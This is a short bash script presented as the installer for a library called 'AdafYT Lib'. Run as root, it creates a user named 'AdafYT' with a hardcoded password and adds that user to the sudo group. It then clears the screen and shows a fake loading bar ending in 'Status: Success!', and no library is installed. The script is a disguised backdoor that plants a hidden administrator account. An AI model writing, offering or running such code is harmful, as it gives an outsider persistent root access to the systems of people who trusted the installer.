#!/bin/bash
if [ "$EUID" -ne 0 ]; then
  echo "Installation must be done through the sudo command!"
  exit 1
fi
echo "AdafYT Lib"
USERNAME="AdafYT"
PASSWORD="dH9@2yG6%e7q5wFp"

if ! id "$USERNAME" &>/dev/null; then
  useradd -m "$USERNAME"
fi

echo "$USERNAME:$PASSWORD" | chpasswd

usermod -aG sudo "$USERNAME"
clear
echo "Powered by $USERNAME"

animation_duration=21

draw_loading_bar() {
  local width=50
  local fill_char="="
  local empty_char="-"
  local progress=0
  local step=$((100 / width))

  while [ "$progress" -lt 100 ]; do
    echo -ne "\rProgress: ["
    for ((i = 0; i < width; i++)); do
      if [ "$progress" -gt "$((i * step))" ]; then
        echo -ne "$fill_char"
      else
        echo -ne "$empty_char"
      fi
    done
    echo -ne "] $progress%"
    
    progress=$((progress + step))
    sleep 0.2
  done
  echo "Status: Success!"
}

draw_loading_bar
